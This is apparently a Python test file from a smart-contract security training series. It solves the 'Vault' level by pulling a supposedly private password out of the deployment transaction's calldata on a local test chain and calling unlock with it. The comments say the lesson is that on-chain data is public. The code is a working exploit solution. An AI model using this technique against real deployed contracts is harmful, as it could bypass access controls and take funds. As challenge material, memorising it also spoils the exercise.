from wake.testing import *
from tests.level_service import LevelService
from pytypes.contracts.i08_vault import Vault


@default_chain.connect()
def test_level_08():
    service = LevelService(default_chain)
    contract = service.deploy_level_08()
    do_level_08_solution(contract, default_chain)
    service.check_level_08(contract)

def do_level_08_solution(contract: Vault, blockchain: Chain):
    # Problem: Blockchain is public, no data can be hidden
    # Training: Representation of blockchain inside the testing framework - in reality you use blockchain explorer

    # find the first block with non-zero transactions count
    block = next(block for block in blockchain.blocks if len(block.txs) > 0)
    # get that blocks first transaction and it's data
    txData = block.txs[0].data
    # get call data string => sub bytes between the transaction ending sequence and padding
    txEndSeq = txData.index(b"\x18\x00")
    padding  = txData.index(b"\x00\x00\x00\x00")
    key = txData[txEndSeq + len(b"\x18\x00") + 1: padding]

    print(f"Extracted key: {key}")
    
    # unlock the contract with extracted key
    contract.unlock(key)
